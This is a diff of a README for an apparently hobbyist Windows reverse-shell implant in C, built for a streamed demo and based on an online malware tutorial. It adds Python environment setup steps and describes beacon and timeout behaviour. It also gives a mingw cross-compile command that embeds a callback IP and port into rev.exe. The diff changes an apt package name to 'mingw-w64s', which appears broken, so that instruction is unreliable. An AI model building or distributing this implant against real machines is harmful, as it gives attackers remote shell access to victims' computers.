@@ -1,3 +1,15 @@
+This branch is for a demo/stream we did. It's probably a dead end unless you are following along with the stream.
+
+To get the requirements to install: (Note, the first command might error and tell you to install a package, do that)
+
+```bash
+python3 -m venv env
+pip install wheel
+pip install -r requirements.txt
+```
+
+
+
 This code was created by following on from https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/. I've taken some liberties and added some stuff like:
 
 Really crappy randomness for the beacon and a timeout after X beacons to stop the thing running if something goes wrong. Also, I haven't tested that because I wasn't patient enough. 
@@ -8,7 +20,7 @@ To compile on Kali
 
 ```bash
 apt install mingw-w64-i686-dev
-apt install mingw-w64
+apt install mingw-w64s
 i686-w64-mingw32-g++ rev.c -o build/rev.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -DIP=\"10.10.10.10\" -DPORT=8080
 ```
 I've moved the IP address out of the source file into the -D switch. 
